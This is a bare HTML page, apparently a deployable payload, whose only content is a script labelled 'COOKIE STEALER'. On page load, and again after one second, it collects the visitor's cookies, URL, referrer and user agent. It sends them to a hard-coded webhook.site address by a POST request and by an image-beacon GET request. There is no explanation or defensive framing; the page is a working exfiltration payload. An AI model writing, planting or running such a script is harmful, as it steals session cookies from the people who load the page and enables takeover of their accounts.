<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <script type="module">
        // === COOKIE STEALER ===
        const sendData = () => {
            const data = {
                cookies: document.cookie || "no-cookies",
                url: location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                time: new Date().toISOString()
            };

            // Send to webhook.site (POST)
            fetch('https://webhook.site/db2682da-2c95-4068-9663-e64473df3067', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(() => {});

            // Backup using Image GET request
            new Image().src = `https://webhook.site/db2682da-2c95-4068-9663-e64473df3067?c=${encodeURIComponent(document.cookie)}&u=${encodeURIComponent(location.href)}`;
        };

        // Run immediately when page loads
        sendData();

        // Also run again after 1 second (in case of delayed cookies)
        setTimeout(sendData, 1000);
    </script>
</body>
</html>
